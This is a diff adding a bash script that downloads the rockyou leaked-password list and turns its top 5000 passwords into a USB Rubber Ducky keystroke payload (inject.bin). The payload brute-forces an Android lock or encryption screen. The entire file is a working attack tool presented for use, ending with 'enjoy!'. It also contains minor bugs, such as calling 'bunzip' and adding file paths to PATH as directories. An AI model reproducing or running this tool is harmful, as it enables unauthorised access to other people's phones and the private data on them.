@@ -1,0 +1,88 @@
+#!/bin/bash
+clear
+echo -e "========================================================"
+echo -e " This script downloads the rockyou password list"
+echo -e " then takes the top 5000 passwords and generates"
+echo -e " an Android brute forcer."
+echo -e "========================================================"
+echo -e " You need to have duckencode.jar installed as well"
+echo -e " as bzip2 and wget."
+echo -e "========================================================"
+echo -e " This script is licensed under the GPLv3 and is"
+echo -e " currently maintained by James Luther (CaptainHooligan)"
+echo -e "========================================================"
+echo ""
+echo ""
+WHOAMI=`id | sed -e 's/(.*//'`
+if [ "$WHOAMI" != "uid=0" ] ; then
+     echo "Sorry, you need super user access to run this script."
+     exit 1
+fi
+echo -e "Verifying prerequisites are installed ... "
+echo ""
+duckdir=`find / -name duckencode.jar`
+if [ -z "$duckdir" ] ; then
+echo "Duckencode.jar not found on system. Please verify you have this installed."
+exit 1
+else
+echo "Duckencode.jar prerequisite met."
+fi
+duckinpath=`which duckencode.jar`
+if [ -z "$duckinpath" ] ; then
+PATH=$PATH:$duckdir
+fi
+bundir=`find / -name bzip2`
+if [ -z "$bundir" ] ; then
+echo "Bzip2 not found on system. Please verify you have this installed."
+exit 1
+else
+echo "Bzip2 prerequisite met."
+fi
+buninpath=`which bzip2`
+if [ -z "$buninpath" ] ; then
+PATH=$PATH:$bundir
+fi
+wgetdir=`find / -name wget`
+if [ -z "$wgetdir" ] ; then
+echo "Wget not found on system. Please verify you have this installed."
+exit 1
+else
+echo "Wget prerequisite met."
+fi
+wgetinpath=`which wget`
+if [ -z "$wgetinpath" ] ; then
+PATH=$PATH:$wgetdir
+fi
+echo ""
+echo ""
+#echo -e "Which do you want to attack?"
+#echo -e " 1. Encryption Screen"
+#echo -e " 2. Password Screen"
+#read answer
+#case answer
+# 1)
+echo -e "Verify connection to internet and press [Enter]."
+read
+echo ""
+echo ""
+echo -e "Downloading rockyou password list. This can take some time ..."
+echo ""
+echo ""
+wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2
+bunzip rockyou.txt.bz2
+echo ""
+echo ""
+echo -e "Creating rock-android.txt file ... "
+echo ""
+echo ""
+echo DELAY 5000 > rock-android.txt; head -5000 rockyou.txt | sed -e 's/^/STRING /' | sed '0~5 s/$/\nWAIT/g' | sed '0~1 s/$/\nDELAY 1000\nENTER\nENTER/g' | sed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' >> rock-android.txt
+echo -e "rock-android.txt created!"
+ls -lart rock-android.txt
+echo ""
+echo ""
+echo -e "Creating inject.bin file ... "
+java -jar duckencode.jar -i rock-android.txt
+echo ""
+echo ""
+echo -e "Inject.bin created. Copy this over to your sdcard and enjoy!"
+ls -lart inject.bin
